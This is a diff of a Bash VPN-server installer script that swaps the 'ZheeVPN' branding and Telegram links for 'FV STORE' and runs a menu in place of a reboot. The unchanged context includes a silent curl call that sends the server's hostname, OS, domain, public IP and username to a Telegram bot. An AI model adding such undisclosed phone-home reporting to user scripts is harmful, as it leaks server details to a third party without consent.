@@ -86,7 +86,7 @@ clear
 clear
 #########################
 # DETAIL ORDER
-username="ZheeVPN"
+username="FV-STORE"
 exp="Lifetime"
 sts="Aktive"
 clear
@@ -293,9 +293,9 @@ function password_default() {
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
     TEXT="
-    ◇━━━━━━━━━━━━━━━━━━━━━◇
-     NOTIF INSTALL SCRIPT V3.0
-    ◇━━━━━━━━━━━━━━━━━━━━━◇
+    ◇━━━━━━━━━━━━━━━━━━━━◇
+    ⚠️ INSTALL SCRIPT V3.0 ⚠️
+    ◇━━━━━━━━━━━━━━━━━━━━◇
     <code>Tanggal  :</code> <code>$tanggal</code>
     <code>Hostname :</code> <code>${HOSTNAME}</code>
     <code>OS Vps   :</code> <code>$OS_Name</code>
@@ -303,14 +303,14 @@ function password_default() {
     <code>Arch     :</code> <code>$Arch</code>
     <code>Ram Left :</code> <code>$Ram_Usage MB</code>
     <code>Ram Used :</code> <code>$Ram_Total MB</code>
-    ◇━━━━━━━━━━━━━━━━━━◇
+    ◇━━━━━━━━━━━━━━━━◇
     <code>Domain   :</code> <code>$domain</code>
-    <code>IP Vps   :</code> <code>$MYIP</code>
+    <code>IP VPS   :</code> <code>$MYIP</code>
     <code>Username :</code> <code>$username</code>
     <code>Expired  :</code> <code>$exp</code>
-    ◇━━━━━━━━━━━━━━━━━━◇
+    ◇━━━━━━━━━━━━━━━━◇
 <i>Automatic Notification from</i>
-"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ🐳","url":"https://t.me/zheevpn"},{"text":"ɪɴꜱᴛᴀʟʟ","url":"https://t.me/zheevpn"}]]}'
+"'&reply_markup={"inline_keyboard":[[{"text":" ORDER ","url":"https://t.me/fdlyvpn_ID"},{"text":" INSTALL ","url":"https://t.me/c/1899398362/30"}]]}'
     curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
 # Pasang SSL
@@ -1027,7 +1027,7 @@ rm -rf /root/domain
 secs_to_human "$(($(date +%s) - ${start}))"
 echo ""
 echo " "
-echo "=====================-[ ZheeVPN ]-===================="
+echo "=====================-[ FV STORE ]-===================="
 echo ""
 echo "------------------------------------------------------------"
 echo ""
@@ -1061,7 +1061,7 @@ echo ""
 echo ""
 echo "------------------------------------------------------------"
 echo ""
-echo "=====================-[ ZheeVPN ]-===================="
+echo "=====================-[ FV STORE ]-===================="
 echo -e ""
 echo ""
 echo "" | tee -a log-install.txt
@@ -1069,5 +1069,5 @@ echo -e ""
 sudo hostnamectl set-hostname $username
 echo -e "${green} Script Successfull Installed"
 echo ""
-read -p "$( echo -e "Press ${YELLOW}[ ${NC}${YELLOW}Enter${NC} ${YELLOW}]${NC} For Reboot") "
-reboot
+read -p "$( echo -e "Press ${YELLOW}[ ${NC}${YELLOW}Enter${NC} ${YELLOW}]${NC} For menu ") "
+menu
